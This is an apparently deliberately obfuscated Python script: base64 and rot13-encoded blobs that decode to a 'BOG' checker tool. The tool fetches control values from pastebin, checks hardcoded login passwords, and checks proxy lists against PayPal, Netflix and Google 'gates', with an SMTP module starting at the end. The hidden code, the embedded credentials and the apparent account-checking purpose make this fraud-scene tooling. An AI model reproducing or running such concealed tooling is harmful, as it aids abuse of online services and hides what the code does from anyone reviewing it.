import base64, codecs
magic = 'I0NIRUNLRVIgVUkKaW1wb3J0IG9zLCBzeXMsIHRpbWUKdHJ5OgogaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICBwcmludCgiIEluc3RhbGxpbmcgcmVxdWVzdHMgTW9kdWxlIikKICBpZiBvcy5uYW1lPT0nbnQnOgogICAgdHJ5OgogICAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCByZXF1ZXN0cycpCiAgICBleGNlcHQ6CiAgICAgIHByaW50ICgiSW5zdGFsbCBQeXRob24tUGlwIFNpciIpCiAgICAgIHJhd19pbnB1dCgnJykKICBlbHNlOgogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQpleGNlcHQ6CiAgcHJpbnQoIiBJbnN0YWxsaW5nIGNvbG9yYW1hIE1vZHVsZSIpCiAgaWYgb3MubmFtZT09J250JzoKICAgIHRyeToKICAgICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQogICAgZXhjZXB0OgogICAgICBwcmludCAoIkluc3RhbGwgUHl0aG9uLVBpcCBTaXIiKQogICAgICByYXdfaW5wdXQoJycpCiAgZWxzZToKICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIGNvbG9yYW1hJykKCnZpdmVzbj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9wV3Z6NmtrcycpLnRleHQKdmVycz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy82dXRMTEs2aCcpLnRleHQKZ3JhdGlzPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L01GbnhSOWRtIikudGV4dApnYXRlMT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9LTEN2SktkTiIpLnRleHQKZ2F0ZTI9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvRzRrVDR3dXgiKS50ZXh0Cm1lbnNhamUgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9IbWpRaGZqeSIpLnRleHQKaWYgc3lzLnZlcnNpb25faW5mb1swXSA8IDM6CiAgaW5wdXQgPSByYXdfaW5wdXQKZWxzZToKICByYXdfaW5wdXQgPSBpbnB1dAoKY3JlZGl0b3M9MTAwCndoaWxlIFRydWU6CgogICAgCiAgICBuYW1lID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IG5vbWJyZSBkZSB1c3VhcmlvOiAnKQogICAgaWYgbmFtZSAhPSAnRW1pbGlvJyBhbmQgbmFtZSAhPSAnRW1tYW51ZWwnIGFuZCBuYW1lICE9ICd1c3I1MjQnIGFuZCBuYW1lICE9ICd1c3IxNjInIGFuZCBuYW1lICE9ICdib2d0ZXN0ZXInIGFuZCBuYW1lICE9ICdzYW0nIGFuZCBuYW1lICE9ICdjaGtncmF0aXMnOgogICAgICAgIHByaW50ICgndXN1YXJpbyBpbmNvcnJlY3RvJykKICAgIGVsc2U6CiAgICAgICAgaWYgbmFtZSA9PSAnRW1pbGlvJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1pbGlvID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IHBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19FbWlsaW8gIT0gJ0FlMTJ2Y2hsJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gTElERVIhICcpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ0VtbWFudWVsJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1tYW51ZWwgPSByYXdfaW5wdXQoJ0luZ3Jlc2Ugc3UgcGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0VtbWFudWVsICE9ICdyb25hbGRpdG8xJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gYSBMSURFUicpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ2JvZ3Rlc3Rlcic6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ3RlYW1ib2cnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgaW5jb3JyZWN0YScpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnc2FtJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAncml1ayc6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyMTYyJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnaGF2b2syNTYnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgSU5DT1JSRUNUQSAnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvIFNpcicpIAogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyNTI0JzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnZG9vbTI1Mic6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnY2hrZ3JhdGlzJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnZ3JhdGlzJzoKICAgICAgICAgICAgICAgICAgcHJpbnQoJ1Bhc3N3b3JkIElOQ09SUkVDVEEnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIGlmIGdyYXRpcz09JzI0NjA2JzoKICAgICAgICAgICAgICAgICAgICBwcmludCgiQmllbnZlbmlkbyIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiTGEgQ3VlbnRhIGFoIGV4cGlyYWRvIikKICAgICAgICAgICAgICAgICAgICBleGl0KCkKZGVmIGNscygpOgoJbGludXggPSAnY2xlYXInCgl3aW5kb3dzID0gJ2NscycKCW9zLnN5c3RlbShbbGludXgsIHdpbmRvd3NdW29zLm5hbWUgPT0gJ250J10pCmlmIHZpdmVzbj09IjEiOgogIGxpdmVzY2hrPSLinJMiCmVsaWYgdml2ZXNuPT0iMCI6CiAgbGl2ZXNjaGs9IuKcmCIKZWxzZToKICBsaXZlc2Noaz0iSU5URVJOQUwgRVJST1IiCiM9PT09PT09PQppZiB2ZXJzPT0iMiI6CiAgcGFzcwplbGlmIHZlcnMgIT0gIjIiOgogIHByaW50KCJIYXkgVW5hIG51ZXZhIHZlcnNpw7NuIikKICBpbnB1dCgiUFJFU0lPTkEgRU5URVIgUEFSQSBDT05USU5VQVIiKQplbHNlOgogIHByaW50KCJFUlJPUiIpCiM9PT09PT09PQp0aW1lLnNsZWVwKDIpCmNscygpCmJhbm5lciA9ICIiIgpAQEBAQEBAICAgQEBAQEBAICAgQEBAQEBAQCAgCkBAISAgQEBAIEBAI'
love = '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'
god = '0geyJodHRwIjogInNvY2tzNDovLyIgKyBwcm94eWlwLCAiaHR0cHMiOiAic29ja3M0Oi8vIiArIHByb3h5aXB9CgogICAgICAgICAgU2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgcmVzcG9uc2UgPSBTZXNzaW9uLmdldChnYXRvcywgcHJveGllcz1wcm94eSwgdGltZW91dD01KQogICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgIHJldHVybiBwdHlwZQogICAgICAgICAgZWxzZToKICAgICAgICAgICAgICByZXR1cm4gIiIKCiAgICAjIFZhbGlkYXRlIHByb3h5IHR5cGUKICAgICAgZGVmIHZlcmlmeVByb3h5KHNlbGYsIHByb3h5KToKICAgICAgICAgIHByb3h5X3R5cGUgPSAiSW52YWxpZCIKICAgICAgICAgIHByb3h5ID0gcHJveHkucmVwbGFjZSgiICIsICIiKQogICAgICAgICAgcHJveHkgPSBwcm94eS5yZXBsYWNlKCJcbiIsICIiKQogICAgICAgICAgcHJpbnQoRm9yZS5DWUFOKyJDSEVDS0lORzoge30iLmZvcm1hdChwcm94eSkpCgogICAgICAgICAgdHJ5OgogICAgICAgICAgICAgIHByb3h5X3R5cGUgPSBzZWxmLmNoZWNrUHJveHkoInNvY2tzNSIsIHByb3h5KQogICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgcHJveHlfdHlwZSA9IHNlbGYuY2hlY2tQcm94eSgic29ja3M0IiwgcHJveHkpCiAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJodHRwcyIsIHByb3h5KQogICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgcHJveHlfdHlwZSA9IHNlbGYuY2hlY2tQcm94eSgiaHR0cCIsIHByb3h5KQogICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgIGlmIHByb3h5X3R5cGUgIT0gIkludmFsaWQiOgogICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4rIkxpdmUhIHt9IEdhdGUgPT4ge30gPT4gI0JvR19DSEtcbiIuZm9ybWF0KHByb3h5LCBib25pdG8pKQogICAgICAgICAgZWxzZToKICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCsiRGVhZCB7fSBHYXRlID0+IHt9ID0+ICNCb0dfQ0hLXG4iLmZvcm1hdChwcm94eSwgYm9uaXRvKSkKCiAgICAgIGRlZiBjaGVja0xpc3Qoc2VsZik6CiAgICAgICAgICB3aXRoIG9wZW4oJy4vcHJveGllcy50eHQnLCAncicpICAgYXMgZjoKICAgICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgICBzZWxmLnZlcmlmeVByb3h5KGxpbmUpCgoKICBjaGVja2VyID0gUHJveHlDaGVja2VyKCkKICBjaGVja2VyLmNoZWNrTGlzdCgpCmVsaWYgbnVtY2hrPT0iMyI6CiAgaW1wb3J0IHJlcXVlc3RzCiAgaW1wb3J0IGRhdGV0aW1lCiAgZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQogIGltcG9ydCB0aHJlYWRpbmcKICBpbXBvcnQgc3lzCiAgaW1wb3J0IHRpbWUKCiAgZGVmIGVzY3JwKHMpOgogICAgICAgICAgZm9yIGMgaW4gcyArICdcbic6CiAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoYykKICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMTAuIC8gMTAwKQoKCiAgZ2xvYmFsIGNvdW50CiAgY291bnQgPSAwCiAgY2xzKCkKICBwcmludCgnJycKCiAgICApICAgICAgICAgKCAgICAgICAgICAgKCAgICAgCiAoIC8oICAgKCAgICAgKVwgKSAgICAgICAgKVwgKSAgCiApXCgpKSAgKVwgICAoKCkvKCAgICggICAoKCkvKCAgCigoXylcKCgoKF8pKCAgLyhfKSkgIClcICAgLyhfKSkgCiBfKChfKSlcIF8gKVwoXykpXyAgKChfKSAoXykpICAgCnwgfHwgfChfKV9cKF8pfCAgIFwgfCBfX3wvIF9ffCAgCnwgX18gfCAvIF8gXCAgfCB8KSB8fCBffCBcX18gXCAgCnxffHxffC9fLyBcX1wgfF9fXy8gfF9fX3x8X19fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIEhUVFAgUHJveHkgQ2hlY2tlciAKICAgICAgICAKMS1Hb29nbGUKMi1QYXlwYWxbQkVTVF0KMy1OZXRmbGl4CjQtQ3VzdG9tIAonJycpCgogIGZpbGUgPSBpbnB1dCgnRW50ZXIgbmFtZSBvZiBmaWxlIHdpdGggcHJveGllczogJykKICBnYXRlcz0gaW5wdXQoIkdhdGU6ICIpCiAgaWYgZ2F0ZXM9PSIxIjoKICAgIGdhdG9zPSJodHRwczovL2dvb2dsZS5jb20vIgogIGVsaWYgZ2F0ZXM9PSIyIjoKICAgIGdhdG9zPSJodHRwczovL3BheXBhbC5jb20vIgoKICBlbGlmIGdhdGVzPT0iMyI6CiAgICBnYXRvcz0iaHR0cHM6Ly9uZXRmbGl4LmNvbS8iCgogIGVsaWYgZ2F0ZXM9PSI0IjoKICAgIHByaW50KCJDdXN0b20gR2F0ZVxuIikKICAgIHByaW50KCJFeDogW2h0dHBzOi8vZXhhbXBsZS5jb20vXSIpCiAgICBnYXRvcyA9IGlucHV0KCJMaW5rOiAiKQogIGVsc2U6CiAgICBnYXRvcz0iaHR0cHM6Ly9jeWJlcnNzaC5jb20vIgogICAgcHJpbnQoImludmFsaWQgW1VTSU5HIEFVWElMSUFSWSBHQVRFXSIpCgogIGlmICcudHh0JyBpbiBmaWxlOgogICAgICBvZmlsZSA9IGZpbGUKICBlbHNlOgogICAgICBvZmlsZSA9IGZpbGUgKyAnLnR4dCcKCiAgd2l0aCBvcGVuKG9maWxlLCdyJykgYXMgcHJveHlmaWxlOgogICAgICBwcm94aWVzID0gcHJveHlmaWxlLnJlYWRsaW5lcygpCiAgICAgIGFtb3VudCA9IGxlbihwcm94aWVzKQoKICBlc2NycChGb3JlLkNZQU4gKyAnQk9HIFNFQ1VSSVRZIC0gSFRUUC9TIFBST1hZIENIRUNLRVInKQoKICBkZWYgY2hlY2tfcHJveGllcyhwcm94eSxhbW91bnQpOgogICAgICBnbG9iYWwgY291bnQKICAgICAgcHJveHkgPSBwcm94eS5zdHJpcCgpCiAgICAgIHByb3h5RGljdCA9IHsgCiAgICAgICAgImh0dHBzIiA6IHByb3h5CiAgICB9CiAgICAgIHN0YXJ0ID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKICAgICAgdHJ5OgoKCiAgICAgICAgICByZXMgPSByZXF1ZXN0cy5nZXQodXJsPWdhdG9zLHByb3hpZXM9cHJveHlEaWN0LHRpbWVvdXQ9NSkKICAgICAgICAgIGlmIHJlcy5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgZW5kID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKICAgICAgICAgICAgICByYXdfc3BlZWQgPSBzdHIoZW5kLXN0YXJ0KS5zcGxpdCgnLicpWzFdCiAgICAgICAgICAgICAgc3BlZWRfaW50ID0gcm91bmQoaW50KHJhd19zcGVlZCksMikKICAgICAgICAgICAgICBzcGVlZCA9IHJvdW5kKHNwZWVkX2ludC8xMDAwKQoKICAgICAgICAgICAgI3ByaW50IHdvcmtpbmcgcHJveGllcyBhbmQgdGhlaXIgc3BlZWQKCiAgICAgICAgICAgICAgcHJveHlfaW5mbyA9IGYne3Byb3h5fSAtIHtzcGVlZH1tcyA9PiBCb0dfQ0hLJwogICAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBwcm94eV9pbmZvKQogICAgICAgICAgICAKICAgICAgICAgICAgICBjb3VudCArPSAxCiAgICAgICAgICAgIAogICAgICAgICAgICAgIAoKICAgICAgICAgICAgCgogICAgICBleGNlcHQ6CiAgICAgICAgICBjb3VudCArPSAxCiAgICAgICAgCiAgICAgICAgICBwYXNzCgoKICBmb3IgcHJveHkgaW4gcHJveGllczoKICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Y2hlY2tfcHJveGllcyhwcm94eSxhbW91bnQpKS5zdGFydCgpCmVsaWYgbnVtY2hrPT0iNCI6CiAgaW1wb3J0IG9zCiAgaW1wb3J0IHNtdHBsaWIKCiAgZGVmIGluaXppYWxlKCk6CiAgICBjbHMoKQogICAgcHJpbnQoIiIiCiAgICAgICAgICA